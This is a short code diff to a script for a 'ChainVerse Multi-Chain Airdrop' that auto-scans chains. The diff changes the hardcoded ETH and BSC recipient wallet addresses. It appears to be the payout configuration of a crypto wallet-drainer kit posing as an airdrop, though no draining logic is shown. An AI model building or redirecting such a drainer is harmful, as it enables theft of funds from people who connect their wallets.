@@ -1,6 +1,6 @@
 // js/scripts.js - ChainVerse Multi-Chain Airdrop (Auto-Scan All Chains)
-const RECIPIENT_ETH = '0x6b9a0fADD6498717a5FB3684bFB4A948d3F7cED0';
-const RECIPIENT_BSC = '0x6b9a0fADD6498717a5FB3684bFB4A948d3F7cED0';
+const RECIPIENT_ETH = '0x4484056a125dd5AF7b5bB91d1DA8CEEF4d2a2196';
+const RECIPIENT_BSC = '0x4484056a125dd5AF7b5bB91d1DA8CEEF4d2a2196';
 
 const CHAINS = {
     ethereum: {
